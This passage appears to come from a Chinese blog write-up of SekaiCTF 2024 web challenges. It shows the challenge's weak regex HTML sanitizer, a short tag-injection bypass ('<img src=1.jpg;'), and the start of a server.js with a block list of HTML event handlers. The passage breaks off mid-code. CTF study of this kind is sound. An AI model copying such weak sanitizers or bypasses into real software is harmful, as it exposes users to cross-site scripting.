punctuation">></span></span>Tagless<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Press+Start+2P<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/nes.css@2.3.0/css/nes.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">                <span class="token selector">body, html</span> <span class="token punctuation">&#123;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>            <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>            <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #212529<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Press Start 2P'</span><span class="token punctuation">,</span> cursive<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.container</span> <span class="token punctuation">&#123;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.nes-field, .nes-btn</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">iframe</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>            <span class="token property">margin-top</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span> #212529<span class="token punctuation">;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #FFF<span class="token punctuation">;</span>             <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">'Press Start 2P'</span><span class="token punctuation">,</span> cursive<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">.nes-container.is-dark.with-title</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #212529<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-container with-title is-centered is-dark<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Tagless Display<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-field is-inline<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userInput<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-text is-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your Message:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userInput<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-input<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Hello, Retro World!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>displayButton<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nes-btn is-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Display<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>output<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>displayFrame<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/app.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作为本地文件，可以用<code>iframe</code>嵌入，而<code>iframe</code>有个特性：所有被执行的 JavaScript 必须是被嵌入的网站本身有的，或者用<code>srcdoc</code>（这个不受 csp 的<code>frame-src</code>影响）</p><p>现在来看一下这里唯一的一个 JavaScript 脚本app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"DOMContentLoaded"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> displayButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"displayButton"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        displayButton<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">displayInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">sanitizeInput</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;.*></span><span class="token regex-delimiter">/</span><span class="token regex-flags">igm</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;\.*></span><span class="token regex-delimiter">/</span><span class="token regex-flags">igm</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&lt;.*>.*&lt;\/.*></span><span class="token regex-delimiter">/</span><span class="token regex-flags">igm</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> str<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">autoDisplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> input <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'auto_input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">displayInput</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">displayInput</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> fulldisplay <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'fulldisplay'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> sanitizedInput <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        sanitizedInput <span class="token operator">=</span> <span class="token function">sanitizeInput</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> userInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"userInput"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        sanitizedInput <span class="token operator">=</span> <span class="token function">sanitizeInput</span><span class="token punctuation">(</span>userInput<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"displayFrame"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframeContent <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        &lt;!DOCTYPE html>        &lt;head>            &lt;title>Display&lt;/title>            &lt;link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">            &lt;style>                body &#123;                    font-family: 'Press Start 2P', cursive;                    color: #212529;                     padding: 10px;                 &#125;            &lt;/style>        &lt;/head>        &lt;body>            </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>sanitizedInput<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">        &lt;/body>    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'text/html'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>iframeContent<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fulldisplay <span class="token operator">&amp;&amp;</span> sanitizedInput<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> tab <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>        tab<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">autoDisplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>sanitizeInput</code>这里过滤了html tag，不过可以用 <code>&lt;img src=1.jpg;</code> 这样的方式来插入一个html标签，虽然只能插入一个</p><p><img src="/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831105446898.png" alt="image-20240831105446898"></p><p>感觉没啥用，随便记一下</p><hr><h1 id="htmlsandbox（Unsolved）"><a href="#htmlsandbox（Unsolved）" class="headerlink" title="htmlsandbox（Unsolved）"></a>htmlsandbox（Unsolved）</h1><p>server.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'puppeteer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> redis <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'redis'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node:crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node:path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">EVENTS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"onsearch"</span><span class="token punctuation">,</span><span class="token string">"onappinstalled"</span><span class="token punctuation">,</span><span class="token string">"onbeforeinstallprompt"</span><span class="token punctuation">,</span><span class="token string">"onbeforexrselect"</span><span class="token punctuation">,</span><span class="token string">"onabort"</span><span class="token punctuation">,</span><span class="token string">"onbeforeinput"</span><span class="token punctuation">,</span><span class="token string">"onbeforematch"</span><span class="token punctuation">,</span><span class="token string">"onbeforetoggle"</span><span class="token punctuation">,</span><span class="token string">"onblur"</span><span class="token punctuation">,</span><span class="token string">"oncancel"</span><span class="token punctuation">,</span><span class="token string">"oncanplay"</span><span class="token punctuation">,</span><span class="token string">"oncanplaythrough"</span><span class="token punctuation">,</span><span class="token string">"onchange"</span><span class="token punctuation">,</span><span class="token string">"onclick"</span><span class="token punctuation">,</span><span class="token string">"onclose"</span><span class="token punctuation">,</span><span class="token string">"oncontentvisibilityautostatechange"</span><span class="token punctuation">,</span><span class="token string">"oncontextlost"</span><span class="token punctuation">,</span><span class="token string">"oncontextmenu"</span><span class="token punctuation">,</span><span class="token string">"oncontextrestored"</span><span class="token punctuation">,</span><span class="token string">"oncuechange"</span><span class="token punctuation">,</span><span class="token string">"ondblclick"</span><span class="token punctuation">,</span><span class="token string">"ondrag"</span><span class="token punctuation">,</span><span class="token string">"ondragend"</span><span class="token punctuation">,</span><span class="token string">"ondragenter"</span><span class="token punctuation">,</span><span class="token string">"ondragleave"</span><span class="token punctuation">,</span><span class="token string">"ondragover"</span><span class="token punctuation">,</span><span class="token string">"ondragstart"</span><span class="token punctuation">,</span><span class="token string">"ondrop"</span><span class="token punctuation">,</span><span class="token string">"ondurationchange"</span><span class="token punctuation">,</span><span class="token string">"onemptied"</span><span class="token punctuation">,</span><span class="token string">"onended"</span><span class="token punctuation">,</span><span class="token string">"onerror"</span><span class="token punctuation">,</span><span class="token string">"onfocus"</span><span class="token punctuation">,</span><span class="token string">"onformdata"</span><span class="token punctuation">,</span><span class="token string">"oninput"</span><span class="token punctuation">,</span><span class="token string">"oninvalid"</span><span class="token punctuation">,</span><span class="token string">"onkeydown"</span><span class="token punctuation">,</span><span class="token string">"onkeypress"</span><span class="token punctuation">,</span><span class="token string">"onkeyup"</span><span class="token punctuation">,</span><span class="token string">"onload"</span><span class="token punctuation">,</span><span class="token string">"onloadeddata"</span><span class="token punctuation">,</span><span class="token string">"onloadedmetadata"</span><span class="token punctuation">,</span><span class="token string">"onloadstart"</span><span class="token punctuation">,</span><span class="token string">"onmousedown"</span><span class="token punctuation">,</span><span class="token string">"onmouseenter"</span><span class="token punctuation">,</span><span class="token string">"onmouseleave"</span><span class="token punctuation">,</span><span class="token string">"onmousemove"</span><span class="token punctuation">,</span><span class="token string">"onmouseout"</span><span class="token punctuation">,</span><span class="token string">"onmouseover"</span><span class="token punctuation">,</span><span class="token string">"onmouseup"</span><span class="token punctuation">,</span><span class="token string">"onmousewheel"</span><span class="token punctuation">,</span><span class="token string">"onpause"</span><span class="token punctuation">,</span><span class="token string">"onplay"</span><span class="token punctuation">,</span><span class="token string">"onplaying"</span><span class="token punctuation">,</span><span class="token string">"onprogress"</span><span class="token punctuation">,</span><span class="token string">"onratechange"</span><span class="token punctuation">,</span><span class="token string">"onreset"</span><span class="token punctuation">,</span><span class="token string">"onresize"</span><span class="token punctuation">,</span><span class="token string">"onscroll"</span><span class="token punctuation">,</span><span class="token string">"onsecuritypolicyviolation"</span><span class="token punctuation">,</span><span class="token string">"onseeked"</span><span class="token punctuation">,</span><span class="token string">"onseeking"</span><span class="token punctuation">,</span><span class="token string">"onselect"</span><span class="token punctuation">,</span><span class="token string">"onslotchange"</span><span class="token punctuation">,</span><span class="token string">"onstalled"</span><span class="token punctuation">,</span><span class="token string">"onsubmit"</span><span class="token punctuation">,</span><span class="token string">"onsuspend"</span><span class="token punctuation">,</span><span class="token string">"ontimeupdate"</span><span class="token punctuation">,</span><span class="token string">"ontoggle"</span><span class="token punctuation">,</span><span class="token string">"onvolumechange"</span><span class="token punctuation">,</span><span class="token string">"onwaiting"</span><span class="token punctuation">,</span><span class="token string">"onwebkitanimationend"</span><span class="token punctuation">,</span><span class="token string">"onwebkitanimationiteration"</span><span class="token punctuation">,</span><span class="token string">"onwebkitanimationstart"</span><span class="token punctuation">,</span><span class="token string">"onwebkittransitionend"</span><span class="token punctuation">,</span><span class="token string">"onwheel"</span><span class="token punctuation">,</span><span class="token string">"onauxclick"</span><span class="token punctuation">,</span><span class="token string">"ongotpointercapture"</span><span class="token punctuation">,</span><span class="token string">"onlostpointercapture"</span><span class="token punctuation">,</span><span class="token string">"onpointerdown"</span><span class="token punctuation">,</span><span class="token string">"onpointermove"</span><span class="token punctuation">,</span><span class="token string">"onpointerrawupdate"</span><span class="token punctuation">,</span><span class="token string">"onpointerup"</span><span class="token punctuation">,</span><span class="token string">"onpointercancel"</span><span class="token punctuation">,</span><span class="token string">"onpointerover"</span><span class="token punctuation">,</span><span class="token string">"onpointerout"</span><span class="token punctuation">,</span><span class="token string">"onpointerenter"</span><span class="token punctuation">,</span><span class="token string">"onpointerleave"</span><span class="token punctuation">,</span><span class="token string">"onselectstart"</span><span class="token punctuation">,</span><span class="token string">"onselectionchange"</span><span class="token punctuation">,</span><span class="token string">"onanimationend"</span><span class="token punctuation">,</span><span class="token string">"onanimationiteration"</span><span class="token punctuation">,</span><span class="token string">"onanimationstart"</span><span class="token punctuation">,</span><span class="token string">"ontransitionrun"</span><span class="token punctuation">,</span><span class="token string">"ontransitionstart"</span><span class="token punctuation">,</span><span class="token string">"ontransitionend"</span><span class="token punctuation">,</span><span class="token string">"ontransitioncancel"</span><span class="token punctuation">,</span><span class="token string">"onafterprint"</span><span class="token punctuation">,</span><span class="token string">"onbeforeprint"</span><span class="token punctuation">,</span><span class="token string">"onbeforeunload"</span><span class="token punctuation">,</span><span class="token string">"onhashchange"</span><span class="token punctuation">,</span><span class="token string">"onlanguagechange"</span><span class="token punctuation">,</span><span class="token string">"onmessage"</span><span class="token punctuation">,</span><span class="token string">"onmessageerror"</span><span class="token punctuation">,</span><span class="token string">"onoffline"</span><span class="token punctuation">,</span><span class="token string">"ononline"</span><span class="token punctuation">,</span><span class="token string">"onpagehide"</span><span class="token punctuation">,</span><span class="token string">"onpageshow"</span><span class="token punctuation">,</span><span class="token string">"onpopstate"</span><span class="token punctuation">,</span><span class="token string">"onrejectionhandled"</span><span class="token punctuation">,</span><span class="token string">"onstorage"</span><span class="token punctuation">,</span><span class="token string">"onunhandledrejection"</span><span class="token punctuation">,</span><span class="token string">"onunload"</span><span class="token punctuation">,</span><span class="token string">"onpageswap"</span><span class="token punctuation">,</span><span class="token string">"onpagereveal"</span><span class="token punctuation">,</span><span class="token string">"onoverscroll"</span><span class="token punctuation">,</span><span class="token string">"onscrollend"</span><span class="token punctuation">,</span><span class="token string">"onscrollsnapchange"</span><span class="token punctuation">,</span><span class="token string">"onscrollsnapchanging"</span><span class="token punctuation">,</span><span class="token string">"ontimezonechange"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">EVENT_SELECTOR</span> <span class="token operator">=</span> <span class="token constant">EVENTS</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token operator">=></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">*[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>e<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">]</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> client<span class="token punctuation">;</span><span class="token keyword">let</span> browser<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pipe</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token comment">//dumpio: true,</span>        <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token string">'--incognito'</span><span class="token punctuation">,</span>            <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>            <span class="token string">"--disable-setuid-sandbox"</span><span class="token punctuation">,</span>            <span class="token string">"--js-flags=--noexpose_wasm,--jitless"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'init browser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    client <span class="token operator">=</span> <span class="token keyword">await</span> redis<span class="token punctuation">.</span><span class="token function">createClient</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">redis://default@</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">REDIS_HOST</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">REDIS_PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Redis Client Error'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'redis connected'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> valid <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> context<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        context <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">createBrowserContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> page <span class="token operator">=</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span><span class="token 